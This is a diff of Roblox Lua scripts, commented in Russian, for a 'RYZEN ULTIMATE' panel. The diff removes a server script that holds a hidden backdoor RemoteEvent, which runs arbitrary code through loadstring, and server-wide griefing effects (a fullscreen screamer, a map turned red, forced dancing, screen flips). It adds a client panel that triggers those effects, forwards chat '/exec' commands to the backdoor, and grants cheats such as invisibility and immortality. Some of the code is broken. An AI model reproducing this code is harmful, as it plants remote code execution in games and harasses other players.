@@ -1,247 +1,346 @@
 -- ============================================================
--- RYZEN ULTIMATE – СЕРВЕРНАЯ ВЕРСИЯ (РАБОТАЕТ У ВСЕХ)
+-- RYZEN ULTIMATE – КЛИЕНТСКАЯ ЧАСТЬ
 -- ============================================================
 
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Lighting = game:GetService("Lighting")
-local Workspace = game:GetService("Workspace")
 local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
+local Lighting = game:GetService("Lighting")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local player = Players.LocalPlayer
+local camera = workspace.CurrentCamera
 
--- Создаём RemoteEvent для связи с клиентами
-local remote = Instance.new("RemoteEvent")
-remote.Name = "RyzenRemote"
-remote.Parent = ReplicatedStorage
+local remote = ReplicatedStorage:FindFirstChild("RyzenRemote")
+if not remote then
+    warn("RemoteEvent не найден!")
+    return
+end
+
+local function notify(title, text)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = title,
+        Text = text,
+        Duration = 3
+    })
+end
 
 -- ============================================================
--- 1. БЭКДОР – ВЫПОЛНЕНИЕ ЛЮБОГО КОДА НА СЕРВЕРЕ
+-- 1. ЛОКАЛЬНЫЕ ЭФФЕКТЫ (ВИДНЫ ТОЛЬКО ЭТОМУ ИГРОКУ)
 -- ============================================================
 
--- Скрытый RemoteEvent для бэкдора
-local backdoorRemote = Instance.new("RemoteEvent")
-backdoorRemote.Name = "Backdoor_" .. HttpService:GenerateGUID(false):sub(1, 8)
-backdoorRemote.Parent = ReplicatedStorage
-
-backdoorRemote.OnServerEvent:Connect(function(player, command, ...)
-    -- Проверка: только создатель скрипта может использовать бэкдор
-    -- (можно убрать проверку, чтобы все могли)
-    if player.UserId ~= 123456789 then -- ЗАМЕНИТЕ НА СВОЙ USER ID!
-        return
+local function playScreamer()
+    local coreGui = game:GetService("CoreGui")
+    local screamerGui = Instance.new("ScreenGui")
+    screamerGui.Name = "Screamer"
+    screamerGui.Parent = coreGui
+    
+    local black = Instance.new("Frame")
+    black.Size = UDim2.new(1, 0, 1, 0)
+    black.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    black.ZIndex = 999
+    black.Parent = screamerGui
+    
+    local text = Instance.new("TextLabel")
+    text.Size = UDim2.new(1, 0, 1, 0)
+    text.BackgroundTransparency = 1
+    text.Text = "😱 RYZEN ATTACK! 😱"
+    text.TextColor3 = Color3.fromRGB(255, 0, 0)
+    text.Font = Enum.Font.GothamBlack
+    text.TextSize = 70
+    text.TextScaled = true
+    text.ZIndex = 1000
+    text.Parent = screamerGui
+    
+    for i = 1, 25 do
+        local stripe = Instance.new("Frame")
+        stripe.Size = UDim2.new(0, math.random(3, 120), 1, 0)
+        stripe.Position = UDim2.new(math.random() * 0.95, 0, 0, 0)
+        stripe.BackgroundColor3 = (i % 2 == 0) and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(255, 0, 0)
+        stripe.ZIndex = 1001
+        stripe.Parent = screamerGui
     end
     
-    local args = {...}
-    local code = args[1]
-    
-    if command == "exec" and code then
-        local func, err = loadstring(code)
-        if func then
-            local success, result = pcall(func)
-            if success then
-                print("[БЭКДОР] Выполнено: " .. code)
-                return result
-            else
-                warn("[БЭКДОР] Ошибка: " .. tostring(result))
-            end
-        else
-            warn("[БЭКДОР] Ошибка загрузки: " .. tostring(err))
+    local shake = RunService.RenderStepped:Connect(function()
+        if not screamerGui or not screamerGui.Parent then
+            shake:Disconnect()
+            return
         end
+        screamerGui.Position = UDim2.new(0, math.random(-45, 45), 0, math.random(-45, 45))
+    end)
+    
+    pcall(function()
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://9120381772"
+        sound.Volume = 1
+        sound.Parent = screamerGui
+        sound:Play()
+    end)
+    
+    return screamerGui, shake
+end
+
+local function removeScreamer(screamerGui, shake)
+    if screamerGui then screamerGui:Destroy() end
+    if shake then shake:Disconnect() end
+end
+
+local function shakeCamera()
+    local orig = camera.CFrame
+    for _ = 1, 30 do
+        camera.CFrame = orig * CFrame.new(
+            math.random(-15, 15)/5,
+            math.random(-15, 15)/5,
+            math.random(-15, 15)/5
+        )
+        task.wait(0.01)
+    end
+    camera.CFrame = orig
+end
+
+local function flipScreen()
+    local orig = camera.CFrame
+    for i = 0, 180, 10 do
+        camera.CFrame = orig * CFrame.Angles(0, 0, math.rad(i))
+        task.wait(0.02)
+    end
+    task.wait(0.5)
+    for i = 180, 0, -10 do
+        camera.CFrame = orig * CFrame.Angles(0, 0, math.rad(i))
+        task.wait(0.02)
+    end
+    camera.CFrame = orig
+end
+
+local function restoreScreen()
+    camera.CFrame = camera.CFrame
+end
+
+local screamerGui = nil
+local screamerShake = nil
+
+-- ============================================================
+-- 2. СЛУШАЕМ КОМАНДЫ ОТ СЕРВЕРА
+-- ============================================================
+
+remote.OnClientEvent:Connect(function(command, ...)
+    if command == "Notify" then
+        local title, text = ...
+        notify(title, text)
+        
+    elseif command == "Screamer" then
+        local on = ...
+        if on then
+            if screamerGui then
+                removeScreamer(screamerGui, screamerShake)
+                screamerGui = nil
+                screamerShake = nil
+            end
+            screamerGui, screamerShake = playScreamer()
+        else
+            if screamerGui then
+                removeScreamer(screamerGui, screamerShake)
+                screamerGui = nil
+                screamerShake = nil
+            end
+        end
+        
+    elseif command == "Shake" then
+        shakeCamera()
+        
+    elseif command == "Flip" then
+        flipScreen()
+        
+    elseif command == "Restore" then
+        restoreScreen()
     end
 end)
 
 -- ============================================================
--- 2. ГЛОБАЛЬНЫЕ ЭФФЕКТЫ (ВИДНЫ ВСЕМ)
+-- 3. GUI
 -- ============================================================
 
-local function notifyAll(title, text)
-    remote:FireAllClients("Notify", title, text)
-end
+local function createGUI()
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "RyzenPanel"
+    gui.ResetOnSpawn = false
+    pcall(function() gui.Parent = player.PlayerGui end)
+    if not gui.Parent then
+        pcall(function() gui.Parent = game:GetService("CoreGui") end)
+    end
 
--- 2.1 ВСЁ КРАСНОЕ
-local function makeEverythingRed()
-    pcall(function()
-        -- Небо
-        local sky = Lighting:FindFirstChild("Sky") or Instance.new("Sky", Lighting)
-        sky.SkyboxBk = "rbxassetid://15050311563"
-        sky.SkyboxDn = "rbxassetid://15050311563"
-        sky.SkyboxLf = "rbxassetid://15050311563"
-        sky.SkyboxRt = "rbxassetid://15050311563"
-        sky.SkyboxUp = "rbxassetid://15050311563"
-        Lighting.FogColor = Color3.fromRGB(200, 0, 0)
-        Lighting.FogEnd = 1000
-        Lighting.Brightness = 2
-        Lighting.Ambient = Color3.fromRGB(100, 0, 0)
-        Lighting.OutdoorAmbient = Color3.fromRGB(100, 0, 0)
-        Lighting.ClockTime = 0.1
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 340, 0, 480)
+    mainFrame.Position = UDim2.new(0.5, -170, 0.5, -240)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+    mainFrame.BorderSizePixel = 2
+    mainFrame.BorderColor3 = Color3.fromRGB(200, 0, 0)
+    mainFrame.Active = true
+    mainFrame.Draggable = true
+    mainFrame.Visible = true
+    mainFrame.Parent = gui
+
+    local mainCorner = Instance.new("UICorner")
+    mainCorner.CornerRadius = UDim.new(0, 10)
+    mainCorner.Parent = mainFrame
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 45)
+    title.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+    title.BorderSizePixel = 0
+    title.Text = "⚡ RYZEN PANEL ⚡"
+    title.TextColor3 = Color3.fromRGB(200, 0, 0)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 18
+    title.Parent = mainFrame
+
+    local scroll = Instance.new("ScrollingFrame")
+    scroll.Size = UDim2.new(1, -10, 1, -55)
+    scroll.Position = UDim2.new(0, 5, 0, 50)
+    scroll.BackgroundTransparency = 1
+    scroll.BorderSizePixel = 0
+    scroll.CanvasSize = UDim2.new(0, 0, 0, 650)
+    scroll.ScrollBarThickness = 6
+    scroll.Parent = mainFrame
+
+    local layout = Instance.new("UIListLayout")
+    layout.Padding = UDim.new(0, 6)
+    layout.SortOrder = Enum.SortOrder.LayoutOrder
+    layout.Parent = scroll
+
+    local function createButton(text, callback)
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(1, -10, 0, 40)
+        btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
+        btn.Text = text
+        btn.TextColor3 = Color3.fromRGB(240, 240, 240)
+        btn.Font = Enum.Font.GothamBold
+        btn.TextSize = 14
+        btn.Parent = scroll
+        local c = Instance.new("UICorner")
+        c.CornerRadius = UDim.new(0, 6)
+        c.Parent = btn
+        btn.MouseEnter:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(180, 0, 0) end)
+        btn.MouseLeave:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55) end)
+        btn.MouseButton1Click:Connect(function() pcall(callback) end)
+        return btn
+    end
+
+    -- КНОПКИ
+    createButton("🔥 ВСЁ КРАСНОЕ (ДЛЯ ВСЕХ)", function()
+        remote:FireServer("Red")
     end)
-    
-    pcall(function()
-        local atmos = Workspace:FindFirstChild("RyzenAtmos")
-        if not atmos then
-            atmos = Instance.new("Atmosphere")
-            atmos.Name = "RyzenAtmos"
-            atmos.Parent = Workspace
+
+    createButton("😱 СКРИМЕР ВКЛ (ДЛЯ ВСЕХ)", function()
+        remote:FireServer("ScreamerOn")
+    end)
+
+    createButton("❌ СКРИМЕР ВЫКЛ (ДЛЯ ВСЕХ)", function()
+        remote:FireServer("ScreamerOff")
+    end)
+
+    createButton("💃 ТАНЕЦ (ДЛЯ ВСЕХ)", function()
+        remote:FireServer("Dance")
+    end)
+
+    createButton("⏹️ ОСТАНОВИТЬ ТАНЕЦ", function()
+        remote:FireServer("StopDance")
+    end)
+
+    createButton("📷 ТРЯСКА (ДЛЯ ВСЕХ)", function()
+        remote:FireServer("Shake")
+    end)
+
+    createButton("🔄 ПЕРЕВОРОТ (ДЛЯ ВСЕХ)", function()
+        remote:FireServer("Flip")
+    end)
+
+    createButton("🔄 ВОССТАНОВИТЬ ВСЁ", function()
+        remote:FireServer("Restore")
+    end)
+
+    -- Бонусные кнопки (только для игрока)
+    createButton("💀 БЕССМЕРТИЕ (ТОЛЬКО Я)", function()
+        local char = player.Character
+        if char and char:FindFirstChild("Humanoid") then
+            char.Humanoid.MaxHealth = math.huge
+            char.Humanoid.Health = math.huge
+            notify("💀", "Бессмертие!")
         end
-        atmos.Color = Color3.fromRGB(200, 0, 0)
-        atmos.Decay = Color3.fromRGB(100, 0, 0)
-        atmos.Density = 0.5
-        atmos.Offset = 0.5
     end)
-    
-    pcall(function()
-        local bloom = Lighting:FindFirstChild("RyzenBloom")
-        if not bloom then
-            bloom = Instance.new("BloomEffect")
-            bloom.Name = "RyzenBloom"
-            bloom.Parent = Lighting
-        end
-        bloom.Intensity = 1.5
-        bloom.Size = 100
-        bloom.Threshold = 0.3
-    end)
-    
-    pcall(function()
-        for _, v in pairs(Workspace:GetDescendants()) do
-            if v:IsA("Terrain") then
-                v:SetMaterialColor(Enum.Material.Grass, Color3.fromRGB(200, 0, 0))
-                v:SetMaterialColor(Enum.Material.Sand, Color3.fromRGB(150, 0, 0))
-                v:SetMaterialColor(Enum.Material.Ground, Color3.fromRGB(100, 0, 0))
-                v:SetMaterialColor(Enum.Material.Rock, Color3.fromRGB(50, 0, 0))
-                v.WaterColor = Color3.fromRGB(200, 0, 0)
-                v.WaterReflectance = 0.5
-                v.WaterTransparency = 0.4
-            end
+
+    createButton("💨 СКОРОСТЬ 120 (ТОЛЬКО Я)", function()
+        local char = player.Character
+        if char and char:FindFirstChild("Humanoid") then
+            char.Humanoid.WalkSpeed = 120
+            notify("💨", "Скорость 120!")
         end
     end)
-    
-    pcall(function()
-        for _, v in pairs(Workspace:GetDescendants()) do
-            if v:IsA("BasePart") and not v:IsDescendantOf(Players) then
-                v.Color = Color3.fromRGB(200, 0, 0)
-                if math.random(1, 3) == 1 then
-                    v.Material = Enum.Material.Neon
+
+    createButton("⬆️ ПРЫЖОК 200 (ТОЛЬКО Я)", function()
+        local char = player.Character
+        if char and char:FindFirstChild("Humanoid") then
+            char.Humanoid.JumpPower = 200
+            notify("⬆️", "Прыжок 200!")
+        end
+    end)
+
+    createButton("👻 НЕВИДИМОСТЬ (ТОЛЬКО Я)", function()
+        local char = player.Character
+        if char then
+            for _, p in pairs(char:GetDescendants()) do
+                if p:IsA("BasePart") then
+                    p.Transparency = 1
                 end
             end
+            notify("👻", "Невидимость!")
         end
     end)
-    
-    notifyAll("🔥", "ВСЁ СТАЛО КРАСНЫМ!")
-end
 
--- 2.2 СКРИМЕР (ЧЁРНЫЙ ЭКРАН У ВСЕХ)
-local function showScreamerAll()
-    remote:FireAllClients("Screamer", true)
-    notifyAll("😱", "СКРИМЕР АКТИВИРОВАН!")
-end
-
-local function hideScreamerAll()
-    remote:FireAllClients("Screamer", false)
-    notifyAll("✅", "Скример убран!")
-end
-
--- 2.3 ТАНЕЦ (ВСЕ ИГРОКИ ТАНЦУЮТ)
-local function danceAll()
-    for _, player in pairs(Players:GetPlayers()) do
-        local char = player.Character
-        if char and char:FindFirstChild("Humanoid") then
-            local humanoid = char.Humanoid
-            local anim = Instance.new("Animation")
-            anim.AnimationId = "rbxassetid://148840371"
-            local track = humanoid:LoadAnimation(anim)
-            track:Play()
-            track.Looped = true
-        end
-    end
-    notifyAll("💃", "ВСЕ ТАНЦУЮТ!")
-end
-
-local function stopDanceAll()
-    for _, player in pairs(Players:GetPlayers()) do
-        local char = player.Character
-        if char and char:FindFirstChild("Humanoid") then
-            local humanoid = char.Humanoid
-            for _, anim in pairs(humanoid:GetPlayingAnimationTracks()) do
-                anim:Stop()
-            end
-        end
-    end
-    notifyAll("⏹️", "Танцы остановлены!")
-end
-
--- 2.4 ТРЯСКА КАМЕРЫ (У ВСЕХ)
-local function shakeAll()
-    remote:FireAllClients("Shake")
-    notifyAll("📷", "ТРЯСКА У ВСЕХ!")
-end
-
--- 2.5 ПЕРЕВОРОТ ЭКРАНА (У ВСЕХ)
-local function flipAll()
-    remote:FireAllClients("Flip")
-    notifyAll("🔄", "ПЕРЕВОРОТ У ВСЕХ!")
-end
-
--- 2.6 ВОССТАНОВЛЕНИЕ
-local function restoreAll()
-    pcall(function()
-        Lighting.FogColor = Color3.fromRGB(255, 255, 255)
-        Lighting.Brightness = 1
-        Lighting.Ambient = Color3.fromRGB(127, 127, 127)
-        Lighting.ClockTime = 12
-        
-        local sky = Lighting:FindFirstChild("Sky")
-        if sky then
-            sky.SkyboxBk = ""
-            sky.SkyboxDn = ""
-            sky.SkyboxLf = ""
-            sky.SkyboxRt = ""
-            sky.SkyboxUp = ""
-        end
-        
-        local atmos = Workspace:FindFirstChild("RyzenAtmos")
-        if atmos then atmos:Destroy() end
-        
-        local bloom = Lighting:FindFirstChild("RyzenBloom")
-        if bloom then bloom:Destroy() end
-        
-        for _, v in pairs(Workspace:GetDescendants()) do
-            if v:IsA("Terrain") then
-                v:SetMaterialColor(Enum.Material.Grass, Color3.fromRGB(0, 255, 0))
-                v:SetMaterialColor(Enum.Material.Sand, Color3.fromRGB(255, 255, 0))
-                v:SetMaterialColor(Enum.Material.Ground, Color3.fromRGB(139, 69, 19))
-                v.WaterColor = Color3.fromRGB(0, 0, 255)
-            end
-            if v:IsA("BasePart") and not v:IsDescendantOf(Players) then
-                v.Color = Color3.fromRGB(255, 255, 255)
-                v.Material = Enum.Material.SmoothPlastic
-            end
-        end
+    -- КНОПКА ДЛЯ БЭКДОРА
+    createButton("🔓 БЭКДОР (ВЫПОЛНИТЬ КОД)", function()
+        local code = game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "БЭКДОР",
+            Text = "Введите код в консоль: /exec ваш_код",
+            Duration = 5
+        })
+        notify("🔓", "Используйте /exec код в чате!")
     end)
-    
-    remote:FireAllClients("Restore")
-    notifyAll("🔄", "ВСЁ ВОССТАНОВЛЕНО!")
+
+    return mainFrame
 end
 
 -- ============================================================
--- 3. ОБРАБОТЧИК КОМАНД ОТ КЛИЕНТОВ
+-- 4. ОБРАБОТЧИК БЭКДОРА
 -- ============================================================
 
-remote.OnServerEvent:Connect(function(player, command, ...)
-    if command == "Red" then
-        makeEverythingRed()
-    elseif command == "ScreamerOn" then
-        showScreamerAll()
-    elseif command == "ScreamerOff" then
-        hideScreamerAll()
-    elseif command == "Dance" then
-        danceAll()
-    elseif command == "StopDance" then
-        stopDanceAll()
-    elseif command == "Shake" then
-        shakeAll()
-    elseif command == "Flip" then
-        flipAll()
-    elseif command == "Restore" then
-        restoreAll()
+-- Отправка команды через чат
+Players.PlayerChatted:Connect(function(msg)
+    if msg:sub(1, 6) == "/exec " then
+        local code = msg:sub(7)
+        local backdoorRemote = ReplicatedStorage:FindFirstChild("Backdoor_")
+        if backdoorRemote then
+            backdoorRemote:FireServer("exec", code)
+            notify("🔓", "Код отправлен на сервер!")
+        else
+            notify("❌", "Бэкдор не найден!")
+        end
     end
 end)
 
-print("✅ RYZEN ULTIMATE – СЕРВЕР ЗАПУЩЕН! ВСЕ ЭФФЕКТЫ РАБОТАЮТ У ВСЕХ!")
+-- ============================================================
+-- 5. ЗАПУСК
+-- ============================================================
+
+local mainFrame = nil
+pcall(function()
+    mainFrame = createGUI()
+end)
+
+UserInputService.InputBegan:Connect(function(input, gpe)
+    if not gpe and input.KeyCode == Enum.KeyCode.X and mainFrame then
+        mainFrame.Visible = not mainFrame.Visible
+    end
+end)
+
+print("✅ RYZEN ULTIMATE – КЛИЕНТ ЗАПУЩЕН!")
